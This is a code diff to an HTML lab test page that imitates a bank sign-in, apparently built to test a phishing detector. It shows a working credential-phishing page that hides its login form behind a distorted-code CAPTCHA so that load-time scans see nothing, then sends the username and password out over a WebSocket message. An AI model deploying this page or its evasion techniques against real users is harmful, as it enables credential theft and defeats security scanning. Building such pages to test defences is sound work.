@@ -4,21 +4,50 @@
 <title>Formosa Demo Bank - Secure sign-in</title></head>
 <body>
   <h1>Formosa Demo Bank</h1>
-  <p style="color:#a00">LAB ATTACK PAGE - CAPTCHA gate, then login over a WebSocket. Fake data only.</p>
-  <div id="slot"><button type="button" id="captcha">I'm not a robot</button></div>
+  <p style="color:#a00">LAB ATTACK PAGE - distorted-code CAPTCHA, then login over a WebSocket. Fake data only.</p>
+
+  <div id="gate">
+    <canvas id="captcha_img" width="150" height="48" aria-label="distorted verification code"></canvas>
+    <div><input id="captcha_input" placeholder="Type the code shown"></div>
+    <button type="button" id="verify">Verify</button>
+    <p id="err" style="color:#a00"></p>
+  </div>
+  <div id="slot"></div>   <!-- login form injected here ONLY after the gate is passed -->
 
   <script>
-    // The CAPTCHA gates the real form (a sandbox that can't solve it sees only this).
-    document.getElementById("captcha").addEventListener("click", () => {
+    function randCode(n){ const a="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; let s="";
+      for(let i=0;i<n;i++) s+=a[Math.floor(Math.random()*a.length)]; return s; }
+    const CODE = randCode(5);
+    const ctx = document.getElementById("captcha_img").getContext("2d");
+    ctx.fillStyle="#eee"; ctx.fillRect(0,0,150,48); ctx.font="26px monospace";
+    for(let i=0;i<CODE.length;i++){ ctx.save(); ctx.translate(14+i*26,34);
+      ctx.rotate((Math.random()-0.5)*0.6); ctx.fillStyle=`hsl(${Math.random()*360},60%,35%)`;
+      ctx.fillText(CODE[i],0,0); ctx.restore(); }
+    for(let i=0;i<6;i++){ ctx.strokeStyle=`hsl(${Math.random()*360},50%,50%)`; ctx.beginPath();
+      ctx.moveTo(Math.random()*150,Math.random()*48); ctx.lineTo(Math.random()*150,Math.random()*48); ctx.stroke(); }
+
+    // ===== LAB-ONLY HOOK (test harness use) ============================
+    // A human reads the code off the image; our automated victim cannot OCR,
+    // so the LAB exposes the expected code here to STAND IN for human reading.
+    // This hook exists ONLY on lab test pages. It is NEVER in the sensor/guard.
+    window.__LAB_CAPTCHA_CODE = CODE;
+    // ===================================================================
+
+    document.getElementById("verify").addEventListener("click", () => {
+      if (document.getElementById("captcha_input").value.trim().toUpperCase() !== CODE) {
+        document.getElementById("err").textContent = "Incorrect code, try again"; return;
+      }
+      document.getElementById("gate").remove();
+      // Interaction-gated: the credential form appears ONLY now, so a load-time
+      // snapshot (taken before interaction) sees nothing sensitive to flag.
       document.getElementById("slot").innerHTML =
         '<input name="username" placeholder="Username">' +
         '<input name="password" type="password" placeholder="Password">' +
-        '<button type="button" id="login">Log in</button>';
-      document.getElementById("login").addEventListener("click", () => {
+        '<button type="button" id="signin">Log in</button>';
+      document.getElementById("signin").addEventListener("click", () => {
         const u = document.querySelector('input[name="username"]').value;
         const p = document.querySelector('input[name="password"]').value;
-        // Exfiltrate over a WebSocket MESSAGE (not a request body or URL).
-        const ws = new WebSocket("ws://127.0.0.1:8004");
+        const ws = new WebSocket("ws://127.0.0.1:8004");     // exfil over a WS message
         ws.onopen = () => { ws.send("username=" + u + "&password=" + p); };
       });
     });
